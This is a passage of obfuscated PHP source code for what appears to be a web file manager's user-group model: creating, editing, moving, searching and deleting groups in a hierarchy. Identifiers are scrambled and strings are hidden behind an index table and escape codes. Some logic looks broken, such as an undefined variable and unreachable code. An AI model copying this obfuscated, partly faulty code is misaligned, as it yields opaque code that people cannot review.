$—Øûİ÷Ï) / $ù‚Ù˜÷) * $ù‚Ù˜÷ - $•úËó’—; $Ğ¾áö”ã = IO::fileSubstr($this->path, $•úËó’—, $»›‰´×à); $ßÎ„è¦Æ[$•úËó’— . $ï»õÀÖ[12]] = $Ğ¾áö”ã; ksort($ßÎ„è¦Æ); $íÄ¬ğè¦ = substr($Ğ¾áö”ã, $èŠéæ‚ - $•úËó’—, $—Øûİ÷Ï); return $íÄ¬ğè¦; } private function log($Åğ‹ÀàÁ, $÷µà¾ğß) { $ãıÂ…ç¥ =& $_SERVER[±Ö‰ô½¯]; $Ü³ÓÄÍ = timeFloat() - $this->timeStart; write_log(sprintf($ãıÂ…ç¥[1775], $Åğ‹ÀàÁ, $this->info[$ãıÂ…ç¥[32]], $Ü³ÓÄÍ, $÷µà¾ğß), $ãıÂ…ç¥[1317]); } } class Message { function __construct() { } public function send($·ÀÇ¨›« = '', $Ã»ŒšË× = array(), $ í¸ ˜ã = "\x74\145\x78\x74") { $¤äş ¥Ä =& $_SERVER[±Ö‰ô½¯]; $“šÍ¡„ª = array($¤äş ¥Ä[33] => $¤äş ¥Ä[1237], $¤äş ¥Ä[170] => $·ÀÇ¨›«); if (in_array($ í¸ ˜ã, array($¤äş ¥Ä[1237], $¤äş ¥Ä[1776]))) { $“šÍ¡„ª[$¤äş ¥Ä[33]] = $ í¸ ˜ã; } $Ã»ŒšË× = array($¤äş ¥Ä[595] => isset($Ã»ŒšË×[$¤äş ¥Ä[595]]) ? $Ã»ŒšË×[$¤äş ¥Ä[595]] : $¤äş ¥Ä[12], $¤äş ¥Ä[682] => isset($Ã»ŒšË×[$¤äş ¥Ä[682]]) ? $Ã»ŒšË×[$¤äş ¥Ä[682]] : $¤äş ¥Ä[12]); if (empty($·ÀÇ¨›«) || empty($Ã»ŒšË×[$¤äş ¥Ä[595]]) && empty($Ã»ŒšË×[$¤äş ¥Ä[682]])) { return !1; } $æ«ÕŒÚá = array($¤äş ¥Ä[1705] => $“šÍ¡„ª, $¤äş ¥Ä[1777] => $Ã»ŒšË×); Hook::trigger($¤äş ¥Ä[1778], $æ«ÕŒÚá); } } goto dÔß›±æÀƒ; D„™¤Ú¡Ê: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\x65" => "\147\162\x6f\165\160\137\x6d\145\164\141", "\155\x65\x74\141\106\151\145\x6c\x64" => "\147\x72\157\x75\160\x49\x44"); protected function cacheFunctionAlias($×şå÷¾…) { $Ğ“¤õÒ¶ =& $_SERVER[±Ö‰ô½¯]; return array($Ğ“¤õÒ¶[2215] => array($×şå÷¾…[0], $Ğ“¤õÒ¶[2216]), $Ğ“¤õÒ¶[2217] => array($×şå÷¾…[0], $Ğ“¤õÒ¶[2218])); } protected function ___getInfo($Õ¡Æ®şæ) { $ƒäˆ…‘® = $this->getInfoSimple($Õ¡Æ®şæ); if (!$ƒäˆ…‘®) { return !1; } return $this->_listDataApplyItem($ƒäˆ…‘®); } protected function ___getInfoSimple($¦ñÏ³¨) { $ÆÀøÛ´ = array($_SERVER[±Ö‰ô½¯][1444] => intval($¦ñÏ³¨)); $ûÀ±ç¼ = $this->where($ÆÀøÛ´)->find(); return is_array($ûÀ±ç¼) ? $ûÀ±ç¼ : array(); } protected function groupAdd($®ñŸ…±¢) { $îĞ˜õı× =& $_SERVER[±Ö‰ô½¯]; if (!$®ñŸ…±¢[$îĞ˜õı×[192]] && isset($®ñŸ…±¢[$îĞ˜õı×[1444]]) && $®ñŸ…±¢[$îĞ˜õı×[1444]] == 1) { if ($ëê×šÃ = $this->getInfoSimple($®ñŸ…±¢[$îĞ˜õı×[1444]], !0)) { return $®ñŸ…±¢[$îĞ˜õı×[1444]]; } } else { $ëê×šÃ = $this->getInfoSimple($®ñŸ…±¢[$îĞ˜õı×[192]]); if (!$ëê×šÃ) { return !1; } } $Òæø©Àğ = $îĞ˜õı×[610]; if ($ëê×šÃ[$îĞ˜õı×[601]]) { $Òæø©Àğ = $ëê×šÃ[$îĞ˜õı×[601]] . $ëê×šÃ[$îĞ˜õı×[1444]] . $îĞ˜õı×[50]; } $ÁÛ­Üêğ = array($îĞ˜õı×[506] => $this->groupNameAuto($®ñŸ…±¢[$îĞ˜õı×[192]], $®ñŸ…±¢[$îĞ˜õı×[32]]), $îĞ˜õı×[489] => $®ñŸ…±¢[$îĞ˜õı×[192]], $îĞ˜õı×[672] => $Òæø©Àğ, $îĞ˜õı×[2219] => $®ñŸ…±¢[$îĞ˜õı×[2123]], $îĞ˜õı×[2220] => 0, $îĞ˜õı×[2140] => 0); $®ñŸ…±¢[$îĞ˜õı×[32]] = $ÁÛ­Üêğ[$îĞ˜õı×[32]]; if (isset($®ñŸ…±¢[$îĞ˜õı×[2158]])) { $ÁÛ­Üêğ[$îĞ˜õı×[2158]] = $®ñŸ…±¢[$îĞ˜õı×[2158]]; } else { $µÑ ÚåÅ = $this->max($îĞ˜õı×[2158]); if (!$µÑ ÚåÅ) { $µÑ ÚåÅ = 0; } $ÁÛ­Üêğ[$îĞ˜õı×[2158]] = $µÑ ÚåÅ + 1; } if (!empty($®ñŸ…±¢[$îĞ˜õı×[1444]])) { $ÁÛ­Üêğ[$îĞ˜õı×[1444]] = $®ñŸ…±¢[$îĞ˜õı×[1444]]; } $½Íö× = $this->add($ÁÛ­Üêğ); $this->groupMetaEdit($½Íö×, $®ñŸ…±¢); Model($îĞ˜õı×[1482])->groupRootAdd($½Íö×); $this->_clearCache($®ñŸ…±¢[$îĞ˜õı×[192]]); return $½Íö×; } protected function groupEdit($ãğ™¼‘“, $ãæ—Ò¢£) { $ÛŒŞï×ƒ =& $_SERVER[±Ö‰ô½¯]; $êÌàÅÅÅ = $this->getInfoSimple($ãğ™¼‘“); if (!$êÌàÅÅÅ) { return !1; } if (!empty($ãæ—Ò¢£[$ÛŒŞï×ƒ[192]])) { $ÓüçŠï» = $this->getInfoSimple($ãæ—Ò¢£[$ÛŒŞï×ƒ[192]]); if (!$ÓüçŠï») { return !1; } if ($êÌàÅÅÅ[$ÛŒŞï×ƒ[1444]] == $ÓüçŠï»[$ÛŒŞï×ƒ[1444]]) { return !1; } if ($ãæ—Ò¢£[$ÛŒŞï×ƒ[192]] != $êÌàÅÅÅ[$ÛŒŞï×ƒ[192]]) { if ($ÓüçŠï»[$ÛŒŞï×ƒ[601]] !== $êÌàÅÅÅ[$ÛŒŞï×ƒ[601]] && strpos($ÓüçŠï»[$ÛŒŞï×ƒ[601]], $êÌàÅÅÅ[$ÛŒŞï×ƒ[601]] . $êÌàÅÅÅ[$ÛŒŞï×ƒ[1444]] . $ÛŒŞï×ƒ[50]) === 0) { return !1; } $ãæ—Ò¢£[$ÛŒŞï×ƒ[672]] = $ÓüçŠï»[$ÛŒŞï×ƒ[601]] . $ãæ—Ò¢£[$ÛŒŞï×ƒ[192]] . $ÛŒŞï×ƒ[50]; $this->_changeChildLevel($êÌàÅÅÅ, $ÓüçŠï»); $this->_clearCache($ÓüçŠï»[$ÛŒŞï×ƒ[1444]]); $this->_clearCache($êÌàÅÅÅ[$ÛŒŞï×ƒ[192]]); } } $this->groupMetaEdit($ãğ™¼‘“, $ãæ—Ò¢£); $this->_clearChildrenCache($êÌàÅÅÅ); return $this->where(array($ÛŒŞï×ƒ[2221] => $ãğ™¼‘“))->save($ãæ—Ò¢£); } private function groupMetaEdit($š•ÏÜ˜, &$¢µ™ô«œ) { $÷¾´Æ–í =& $_SERVER[±Ö‰ô½¯]; if (isset($¢µ™ô«œ[$÷¾´Æ–í[32]])) { $this->setNamePinyin($š•ÏÜ˜, $¢µ™ô«œ[$÷¾´Æ–í[32]]); } if (isset($¢µ™ô«œ[$÷¾´Æ–í[2222]])) { $íª‘ùáâ = array($÷¾´Æ–í[2222] => $¢µ™ô«œ[$÷¾´Æ–í[2222]], $÷¾´Æ–í[2223] => $¢µ™ô«œ[$÷¾´Æ–í[2223]]); unset($¢µ™ô«œ[$÷¾´Æ–í[2222]]); unset($¢µ™ô«œ[$÷¾´Æ–í[2223]]); if (isset($¢µ™ô«œ[$÷¾´Æ–í[2224]])) { $…¥–¹À¸ = $÷¾´Æ–í[1440] . $š•ÏÜ˜; $Ïô‡Üì = $÷¾´Æ–í[1439]; $êÍ“ûİ« = $¢µ™ô«œ[$÷¾´Æ–í[2224]] ? $¢µ™ô«œ[$÷¾´Æ–í[2224]] : $÷¾´Æ–í[12]; $ÄòğË‰ö = Model($÷¾´Æ–í[1438])->get($…¥–¹À¸, $Ïô‡Üì); $ÄòğË‰ö = $ÄòğË‰ö ? $ÄòğË‰ö : $÷¾´Æ–í[12]; if ($ÄòğË‰ö != $êÍ“ûİ«) { if (!$êÍ“ûİ« && $ÄòğË‰ö) { Model($÷¾´Æ–í[1438])->remove($…¥–¹À¸, $Ïô‡Üì); } else { if ($êÍ“ûİ«) { Model($÷¾´Æ–í[1438])->set($…¥–¹À¸, $êÍ“ûİ«, $Ïô‡Üì); } } } $íª‘ùáâ[$÷¾´Æ–í[2224]] = $êÍ“ûİ«; } $this->metaSet($š•ÏÜ˜, $íª‘ùáâ); } } private function _clearChildrenCache($ø¬À¸¾Ï) { $¤Ğšå¸ı =& $_SERVER[±Ö‰ô½¯]; $ìŒ—Øç§ = array($¤Ğšå¸ı[672] => array($¤Ğšå¸ı[632], $ø¬À¸¾Ï[$¤Ğšå¸ı[601]] . $ø¬À¸¾Ï[$¤Ğšå¸ı[1444]] . $¤Ğšå¸ı[633])); $ÜîÀŒ±ù = $this->field($¤Ğšå¸ı[1444])->where($ìŒ—Øç§)->select(); foreach ($ÜîÀŒ±ù as $û½¹¯… ) { $this->_clearCache($û½¹¯… [$¤Ğšå¸ı[1444]]); } } private function _clearCache($œğøøş¹) { $âçáö¶ä =& $_SERVER[±Ö‰ô½¯]; $this->cacheFunctionClear($âçáö¶ä[2225], $œğøøş¹); $this->cacheFunctionClear($âçáö¶ä[2226], $œğøøş¹); } private function _changeChildLevel($ÇÓ¬äàÊ, $øÍå€ßç, $³¦É¼À† = false) { $«½ØöÚÖ =& $_SERVER[±Ö‰ô½¯]; $Š–ø±ÚÀ = $ÇÓ¬äàÊ[$«½ØöÚÖ[601]] . $ÇÓ¬äàÊ[$«½ØöÚÖ[1444]] . $«½ØöÚÖ[50]; $ßÛ€£Ú = $øÍå€ßç[$«½ØöÚÖ[601]] . $øÍå€ßç[$«½ØöÚÖ[1444]] . $«½ØöÚÖ[50] . $ÇÓ¬äàÊ[$«½ØöÚÖ[1444]] . $«½ØöÚÖ[50]; if ($³¦É¼À†) { $ßÛ€£Ú = $øÍå€ßç[$«½ØöÚÖ[601]] . $øÍå€ßç[$«½ØöÚÖ[1444]] . $«½ØöÚÖ[50]; } $Ø¹×±èÒ = array($«½ØöÚÖ[672] => array($«½ØöÚÖ[632], $ÇÓ¬äàÊ[$«½ØöÚÖ[601]] . $ÇÓ¬äàÊ[$«½ØöÚÖ[1444]] . $«½ØöÚÖ[633])); $ñ÷Ş‚­ = array($«½ØöÚÖ[672] => array($«½ØöÚÖ[681], "\162\145\x70\154\141\143\x65\50\160\x61\162\145\x6e\x74\114\x65\x76\x65\x6c\x2c\x27{$Š–ø±ÚÀ}\x27\54\x27{$ßÛ€£Ú}\47\x29")); $this->_clearChildrenCache($ÇÓ¬äàÊ); $this->where($Ø¹×±èÒ)->data($ñ÷Ş‚­)->save(); } public function setNamePinyin($üüÑ¼¨, $Ğ¿Ë¬Âó = false) { $¬ÕÆ¤³ğ =& $_SERVER[±Ö‰ô½¯]; if (!$Ğ¿Ë¬Âó) { $õ´ßÙ¹ş = $this->getInfoSimple($üüÑ¼¨); $Ğ¿Ë¬Âó = $õ´ßÙ¹ş[$¬ÕÆ¤³ğ[32]]; } if (!Input::check($Ğ¿Ë¬Âó, $¬ÕÆ¤³ğ[675])) { $this->metaSet($üüÑ¼¨, $¬ÕÆ¤³ğ[549], null); $this->metaSet($üüÑ¼¨, $¬ÕÆ¤³ğ[548], null); return; } $İá—â­• = array($¬ÕÆ¤³ğ[549] => str_replace($¬ÕÆ¤³ğ[53], $¬ÕÆ¤³ğ[12], Pinyin::get($Ğ¿Ë¬Âó)), $¬ÕÆ¤³ğ[548] => Pinyin::get($Ğ¿Ë¬Âó, $¬ÕÆ¤³ğ[676])); $this->metaSet($üüÑ¼¨, $İá—â­•); } protected function metaSet($”¹û•’à, $ïˆã´ğ = null, $ÕäêÂ£à = null) { $this->_clearCache($”¹û•’à); return parent::metaSet($”¹û•’à, $ïˆã´ğ, $ÕäêÂ£à); } protected function groupStatus($¾Íí×öÃ, $ÚÅšÃ‹Ã) { $ÔÉ”ì§ =& $_SERVER[±Ö‰ô½¯]; $‡²š™‹Á = $this->getInfoSimple($¾Íí×öÃ); if (!$‡²š™‹Á) { return !1; } $this->_clearCache($¾Íí×öÃ); return $this->metaSet($¾Íí×öÃ, $ÔÉ”ì§[847], $ÚÅšÃ‹Ã); if ($ÚÅšÃ‹Ã == $ÔÉ”ì§[91]) { $ğ³ÅÓ€ò = $this->parentLevelArray($‡²š™‹Á[$ÔÉ”ì§[601]]); } else { } $ğ³ÅÓ€ò[] = $‡²š™‹Á[$ÔÉ”ì§[1444]]; $’Ä„¢† = array(); foreach ($ğ³ÅÓ€ò as $¾Íí×öÃ) { $’Ä„¢†[] = array($ÔÉ”ì§[1444] => $¾Íí×öÃ, $ÔÉ”ì§[95] => $ÔÉ”ì§[847], $ÔÉ”ì§[452] => $ÚÅšÃ‹Ã); $this->_clearCache($¾Íí×öÃ); } return Model($ÔÉ”ì§[2227])->addAll($’Ä„¢†, array(), !0); } protected function groupRemove($Õ¥Š€×Ø, $ù³¤ÅØ = false) { $î±û®¹ô =& $_SERVER[±Ö‰ô½¯]; $ÁË Ğè„ = array($î±û®¹ô[1444] => $Õ¥Š€×Ø); $“‚ ëè = $this->where($ÁË Ğè„)->find(); if (!$“‚ ëè || $“‚ ëè[$î±û®¹ô[192]] == 0) { return !1; } if (!$ù³¤ÅØ) { $•şıˆÙ = $this->getInfoSimple($“‚ ëè[$î±û®¹ô[192]]); $this->_changeChildLevel($“‚ ëè, $•şıˆÙ, !0); $this->where(array($î±û®¹ô[192] => $Õ¥Š€×Ø))->save(array($î±û®¹ô[192] => $“‚ ëè[$î±û®¹ô[192]])); $this->_clearCache($•şıˆÙ[$î±û®¹ô[1444]]); } Model($î±û®¹ô[2227])->where($ÁË Ğè„)->delete(); Model($î±û®¹ô[2228])->where($ÁË Ğè„)->delete(); Model($î±û®¹ô[930])->groupRootRemove($Õ¥Š€×Ø); $this->_clearCache($“‚ ëè[$î±û®¹ô[192]]); return $this->where($ÁË Ğè„)->delete(); } protected function groupSort($¿»‹È¼„) { $‚«İÎ¶• =& $_SERVER[±Ö‰ô½¯]; $¶€¯Æö– = array(); foreach ($¿»‹È¼„ as $»‰”‡¾¼ => $óª¶«éß) { $¶€¯Æö–[] = array($‚«İÎ¶•[1444], $óª¶«éß, $‚«İÎ¶•[2158], $»‰”‡¾¼ + 1); } $this->saveAll($¶€¯Æö–); } public function listData() { $ŞÉ¢ğÙğ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ŞÉ¢ğÙğ[$_SERVER[±Ö‰ô½¯][447]]); return $ŞÉ¢ğÙğ; } private function _makeOrder($çª£°ÒÆ = '') { $¬Ñá¿É¯ =& $_SERVER[±Ö‰ô½¯]; $ÇÎ¤º§ñ = array($¬Ñá¿É¯[1444], $¬Ñá¿É¯[32], $¬Ñá¿É¯[2125], $¬Ñá¿É¯[233]); $ù»¸À¢İ = array($¬Ñá¿É¯[534] => $¬Ñá¿É¯[535], $¬Ñá¿É¯[536] => $¬Ñá¿É¯[537]); $Á‹ÎÎƒÈ = Input::get($¬Ñá¿É¯[541], $¬Ñá¿É¯[7], $¬Ñá¿É¯[2140], $ÇÎ¤º§ñ); $šœı·› = Input::get($¬Ñá¿É¯[542], $¬Ñá¿É¯[7], $¬Ñá¿É¯[2229], array($¬Ñá¿É¯[2229], $¬Ñá¿É¯[536])); $šœı·› = $ù»¸À¢İ[$šœı·›]; $çª£°ÒÆ = $çª£°ÒÆ . "{$Á‹ÎÎƒÈ}\x20{$šœı·›}\x2c\40\x67\x72\x6f\165\x70\x49\x44\40\x61\163\143"; return $this->order($çª£°ÒÆ); } public function listChild($á ˜áè) { $»å¯‘¹Ç =& $_SERVER[±Ö‰ô½¯]; $£¨•ßÙº = $this->where(array($»å¯‘¹Ç[192] => $á ˜áè))->_makeOrder()->selectPage(200); $this->_listDataApply($£¨•ßÙº[$»å¯‘¹Ç[447]]); return $£¨•ßÙº; } public function listChildIds($Ò­şí‰İ) { $çµ•Ñ”® =& $_SERVER[±Ö‰ô½¯]; if (is_string($åöÔÉû³)) { $Ò­şí‰İ = explode($çµ•Ñ”®[50], $Ò­şí‰İ); } $ë…·› = $this->where(array($çµ•Ñ”®[1444] => array($çµ•Ñ”®[7], $Ò­şí‰İ)))->field($çµ•Ñ”®[2230])->select(); if (!$ë…·›) { return !1; } $’ŒÃÑ‹… = array(); foreach ($ë…·› as $·®¤¯ì) { $’ŒÃÑ‹…[] = "\x73\x65\154\x65\143\x74\x20\147\162\157\165\160\111\104\40\146\162\x6f\x6d\x20\140\x67\162\x6f\x75\x70\x60\x20\167\x68\145\x72\145\x20\x70\141\x72\x65\156\164\114\145\166\x65\154\x20\x6c\151\153\145\x20\47{$·®¤¯ì[$çµ•Ñ”®[601]]}{$·®¤¯ì[$çµ•Ñ”®[1444]]}\54\x25\x27"; } $’ŒÃÑ‹… = implode($çµ•Ñ”®[2231], $’ŒÃÑ‹…); $ë…·› = $this->query($’ŒÃÑ‹…); if (!$ë…·›) { return array(); } $Ò­şí‰İ = array_to_keyvalue($ë…·›, $çµ•Ñ”®[12], $çµ•Ñ”®[1444]); return array_unique($Ò­şí‰İ); } public function listByID($‡™äĞ¸§) { $®ù£ƒ· =& $_SERVER[±Ö‰ô½¯]; if (!$‡™äĞ¸§) { return array(); } $ŒáƒÉ–İ = array($®ù£ƒ·[1444] => array($®ù£ƒ·[7], $‡™äĞ¸§)); $æİŒóÓä = $this->where($ŒáƒÉ–İ)->select(); $æİŒóÓä = array_sort_keep($æİŒóÓä, $®ù£ƒ·[1444], $‡™äĞ¸§); $this->_listDataApply($æİŒóÓä); return $æİŒóÓä; } public function listSearch($ùÊªµÛŞ) { $ğ±¯ßÆµ =& $_SERVER[±Ö‰ô½¯]; $ÍÌ»‡ ş = trim($ùÊªµÛŞ[$ğ±¯ßÆµ[2232]]); $–ÎÑû› = explode($ğ±¯ßÆµ[53], $ÍÌ»‡ ş); if (!$ÍÌ»‡ ş || count($–ÎÑû›) == 1) { return $this->listSearchNow($ùÊªµÛŞ); } $ı÷ßõõÀ = array($ğ±¯ßÆµ[447] => array()); foreach ($–ÎÑû› as $¿Å°§Øô) { if (!trim($¿Å°§Øô)) { continue; } $ùÊªµÛŞ[$ğ±¯ßÆµ[2232]] = $¿Å°§Øô; $ºØÙ¦Øå = $this->listSearchNow($ùÊªµÛŞ); $ı÷ßõõÀ[$ğ±¯ßÆµ[447]] = array_merge($ı÷ßõõÀ[$ğ±¯ßÆµ[447]], $ºØÙ¦Øå[$ğ±¯ßÆµ[447]]); } $ı÷ßõõÀ[$ğ±¯ßÆµ[447]] = array_unique_by_key($ı÷ßõõÀ[$ğ±¯ßÆµ[447]], $ğ±¯ßÆµ[1444]); $ı÷ßõõÀ[$ğ±¯ßÆµ[444]] = array($ğ±¯ßÆµ[445] => count($ı÷ßõõÀ[$ğ±¯ßÆµ[447]]), $ğ±¯ßÆµ[441] => 20, $ğ±¯ßÆµ[430] => 1, $ğ±¯ßÆµ[446] => 1); return $ı÷ßõõÀ; } public function listSearchNow($¨õÂÀìÓ) { $‡×ìêŒû =& $_SERVER[±Ö‰ô½¯]; $—èÕşÚ = trim($¨õÂÀìÓ[$‡×ìêŒû[2232]]); $ñÔïÁà¼ = isset($¨õÂÀìÓ[$‡×ìêŒû[2233]]) ? $¨õÂÀìÓ[$‡×ìêŒû[2233]] : !1; if (!trim($—èÕşÚ)) { return !1; } $—èÕşÚ = str_replace($‡×ìêŒû[2234], $‡×ìêŒû[2235], $—èÕşÚ); $ë”‘÷úŒ = array($‡×ìêŒû[1444] => array($‡×ìêŒû[471], "{$—èÕşÚ}\x25"), $‡×ìêŒû[32] => array($‡×ìêŒû[471], "\45{$—èÕşÚ}\45"), $‡×ìêŒû[1116] => $‡×ìêŒû[2236]); if ($ñÔïÁà¼) { $»ä—±©° = $this->getInfoSimple($ñÔïÁà¼); $îÌ’Ä‡¶ = $»ä—±©°[$‡×ìêŒû[601]] . $ñÔïÁà¼ . $‡×ìêŒû[633]; $ë”‘÷úŒ = array($ë”‘÷úŒ, array($‡×ìêŒû[601] => array($‡×ìêŒû[471], $îÌ’Ä‡¶))); } $ë”‘÷úŒ = $this->parseWhereLike($ë”‘÷úŒ); $’‰¿ÔÈ­ = $this->_makeOrder()->where($ë”‘÷úŒ)->selectPage(20); $’‰¿ÔÈ­ = $’‰¿ÔÈ­ ? $’‰¿ÔÈ­ : array($‡×ìêŒû[447] => array(), $‡×ìêŒû[444] => array()); if (!$’‰¿ÔÈ­ || count($’‰¿ÔÈ­[$‡×ìêŒû[447]]) < 5 && Input::check($—èÕşÚ, $‡×ìêŒû[395])) { $È¶Ò¯Ñ– = $this->groupChildrenAll($ñÔïÁà¼); $œÌÕ…Ö = $this->_searchFromMeta($‡×ìêŒû[548], $—èÕşÚ, 10, $È¶Ò¯Ñ–); $ôô‹ßØ¿ = $this->_searchFromMeta($‡×ìêŒû[549], $—èÕşÚ, 10, $È¶Ò¯Ñ–); $¿¯†ÈÕæ = array_merge($œÌÕ…Ö, $ôô‹ßØ¿, $’‰¿ÔÈ­[$‡×ìêŒû[447]]); $’‰¿ÔÈ­[$‡×ìêŒû[447]] = array_unique_by_key($¿¯†ÈÕæ, $‡×ìêŒû[1444]); $’‰¿ÔÈ­[$‡×ìêŒû[444]][$‡×ìêŒû[445]] = count($’‰¿ÔÈ­[$‡×ìêŒû[447]]); $’‰¿ÔÈ­[$‡×ìêŒû[444]][$‡×ìêŒû[446]] = ceil($’‰¿ÔÈ­[$‡×ìêŒû[444]][$‡×ìêŒû[445]] / $’‰¿ÔÈ­[$‡×ìêŒû[444]][$‡×ìêŒû[441]]); } $this->_listDataApply($’‰¿ÔÈ­[$‡×ìêŒû[447]]); return $’‰¿ÔÈ­; } protected function groupChildrenAll($Ò—ì¹œÅ) { $Æœ˜ÔÇÃ =& $_SERVER[±Ö‰ô½¯]; if (!$Ò—ì¹œÅ) { return !1; } if (!is_array($Ò—ì¹œÅ)) { $Ò—ì¹œÅ = array($Ò—ì¹œÅ); } $Ó«¶¤Ú = $Ò—ì¹œÅ; foreach ($Ò—ì¹œÅ as $ü¤ÎÃ¬ë) { $ĞÀ¾¼Ô = $this->getInfoSimple($ü¤ÎÃ¬ë); $Ò¾‰ûÊ = array($Æœ˜ÔÇÃ[601] => array($Æœ˜ÔÇÃ[471], $ĞÀ¾¼Ô[$Æœ˜ÔÇÃ[601]] . $ü¤ÎÃ¬ë . $Æœ˜ÔÇÃ[633])); $Åï²¶ƒ¡ = $this->field($Æœ˜ÔÇÃ[1444])->where($Ò¾‰ûÊ)->select(); $Ó«¶¤Ú = array_merge($Ó«¶¤Ú, array_to_keyvalue($Åï²¶ƒ¡, $Æœ˜ÔÇÃ[12], $Æœ˜ÔÇÃ[1444])); } return array_unique($Ó«¶¤Ú); } private function _searchFromMeta($î¦û«Õ£, $€·ŠšØ, $ÅÂ’°ñ, $Áúè¸ç¬) { $üù¡æø‡ =& $_SERVER[±Ö‰ô½¯]; $€·ŠšØ = strtolower($€·ŠšØ); $‹ŞÎø”“ = array($üù¡æø‡[95] => $î¦û«Õ£, $üù¡æø‡[452] => array($üù¡æø‡[471], "\x25{$€·ŠšØ}\45")); $‹ŞÎø”“ = $this->parseWhereLike($‹ŞÎø”“); if ($Áúè¸ç¬) { $‹ŞÎø”“[$üù¡æø‡[1444]] = array($üù¡æø‡[7], $Áúè¸ç¬); } $‹ğ§–Øì = Model($üù¡æø‡[2237])->where($‹ŞÎø”“)->limit($ÅÂ’°ñ)->select(); if (!$‹ğ§–Øì) { return array(); } $‹ğ§–Øì = array_to_keyvalue($‹ğ§–Øì, $üù¡æø‡[12], $üù¡æø‡[1444]); $Î—¦™œ¢ = $this->where(array($üù¡æø‡[2221] => array($üù¡æø‡[7], $‹ğ§–Øì)))->select(); if (!$Î—¦™œ¢) { return array(); } return $Î—¦™œ¢; } protected function _listDataApplyItem($êñŠƒĞ¦) { $ü‰¼ãÖ¿ = array($êñŠƒĞ¦); $this->_listDataApply($ü‰¼ãÖ¿); return $ü‰¼ãÖ¿[0]; } protected function _listDataApply(&$îù¾¯ŒÒ) { $Ñ–ü–å =& $_SERVER[±Ö‰ô½¯]; if (!$îù¾¯ŒÒ) { return; } $´«ç¥¯ = array_to_keyvalue($îù¾¯ŒÒ, $Ñ–ü–å[12], $Ñ–ü–å[1444]); $this->_listAppendChildren($îù¾¯ŒÒ); $this->_listAppendChildrenMember($îù¾¯ŒÒ); $this->_listAppendMeta($îù¾¯ŒÒ, $´«ç¥¯); $this->_listAppendParent($îù¾¯ŒÒ); $this->_listAppendSourceRoot($îù¾¯ŒÒ, $´«ç¥¯); } private function _listAppendChildren(&$’ãå¦ÄÁ) { $ğĞş×ş© =& $_SERVER[±Ö‰ô½¯]; $‡©Ú­Ê¶ = array_to_keyvalue($’ãå¦ÄÁ, $ğĞş×ş©[12], $ğĞş×ş©[1444]); $ªÍ—Ş = array($ğĞş×ş©[192] => array($ğĞş×ş©[7], $‡©Ú­Ê¶)); $‹·„Ü¬Æ = array($ğĞş×ş©[192], $ğĞş×ş©[2238] => $ğĞş×ş©[582]); $ı–è±Ø = $this->field($‹·„Ü¬Æ)->where($ªÍ—Ş)->group($ğĞş×ş©[192])->select(); $øµ¬ÅÌ§ = array_to_keyvalue($ı–è±Ø, $ğĞş×ş©[192], $ğĞş×ş©[582]); foreach ($’ãå¦ÄÁ as &$Íå°ÅˆÌ) { $°ò£µ¢„ = $Íå°ÅˆÌ[$ğĞş×ş©[1444]]; $Íå°ÅˆÌ[$ğĞş×ş©[2239]] = isset($øµ¬ÅÌ§[$°ò£µ¢„]) ? intval($øµ¬ÅÌ§[$°ò£µ¢„]) : !1; } unset($Íå°ÅˆÌ); } private function _listAppendChildrenMember(&$Ğ´ÍäŞü) { $ğİèëŸŠ =& $_SERVER[±Ö‰ô½¯]; $ÄÍ×ğ€ = array_to_keyvalue($Ğ´ÍäŞü, $ğİèëŸŠ[12], $ğİèëŸŠ[1444]); $™³¤Ş‰Æ = array($ğİèëŸŠ[1444] => array($ğİèëŸŠ[7], $ÄÍ×ğ€)); $Ø‚¥èó = array($ğİèëŸŠ[1444], $ğİèëŸŠ[2238] => $ğİèëŸŠ[582]); $ú£œ÷úÅ = Model($ğİèëŸŠ[2228])->field($Ø‚¥èó)->where($™³¤Ş‰Æ)->group($ğİèëŸŠ[1444])->select(); $óÌ—Í§ = array_to_keyvalue($ú£œ÷úÅ, $ğİèëŸŠ[1444], $ğİèëŸŠ[582]); foreach ($Ğ´ÍäŞü as &$×Œ£šñ‘) { $Ñ¬æäÍÔ = $×Œ£šñ‘[$ğİèëŸŠ[1444]]; $×Œ£šñ‘[$ğİèëŸŠ[2240]] = isset($óÌ—Í§[$Ñ¬æäÍÔ]) ? intval($óÌ—Í§[$Ñ¬æäÍÔ]) : !1; } unset($×Œ£šñ‘); } private function _listAppendMeta(&$ÎÓŒìÎ¡, $¼ı—ÔÓ) { $†‚Îğƒ =& $_SERVER[±Ö‰ô½¯]; $‘şÑ‹†˜ = array($†‚Îğƒ[1444] => array($†‚Îğƒ[7], $¼ı—ÔÓ)); $Õ²Ä±¥° = Model($†‚Îğƒ[2227])->where($‘şÑ‹†˜)->select(); $Õ²Ä±¥° = array_to_keyvalue_group($Õ²Ä±¥°, $†‚Îğƒ[1444]); foreach ($Õ²Ä±¥° as &$õĞ©­ºà) { $õĞ©­ºà = array_to_keyvalue($õĞ©­ºà, $†‚Îğƒ[95], $†‚Îğƒ[452]); } unset($õĞ©­ºà); foreach ($ÎÓŒìÎ¡ as &$ñ½Ô¨Ü) { $ñ½Ô¨Ü[$†‚Îğƒ[552]] = array(); if (isset($Õ²Ä±¥°[$ñ½Ô¨Ü[$†‚Îğƒ[1444]]])) { $ñ½Ô¨Ü[$†‚Îğƒ[552]] = $Õ²Ä±¥°[$ñ½Ô¨Ü[$†‚Îğƒ[1444]]]; } } unset($ñ½Ô¨Ü); } protected function parentLevelArray($»»Îæ–Ö) { $•Ê²íî =& $_SERVER[±Ö‰ô½¯]; $»»Îæ–Ö = explode($•Ê²íî[50], trim($»»Îæ–Ö, $•Ê²íî[50])); $»»Îæ–Ö = array_remove_value($»»Îæ–Ö, $•Ê²íî[230]); return $»»Îæ–Ö; } protected function parentInGroup($¹œ©”Öñ, $”À•Çë) { $š›­àöÓ =& $_SERVER[±Ö‰ô½¯]; $“¸‰ÆÎ– = $this->getInfoSimple($¹œ©”Öñ); if (!$“¸‰ÆÎ–) { return !0; } $ø†«›‚ = $this->parentLevelArray($“¸‰ÆÎ–[$š›­àöÓ[601]]); $ø†«›‚[] = $¹œ©”Öñ; foreach ($ø†«›‚ as $¹œ©”Öñ) { if (in_array($¹œ©”Öñ . $š›­àöÓ[12], $”À•Çë)) { return !0; } } return !1; } private function _listAppendParent(&$¯¨¢Ü¯) { $ŞŸ©Ü¦“ =& $_SERVER[±Ö‰ô½¯]; $Û¬õ…İÓ = array(); foreach 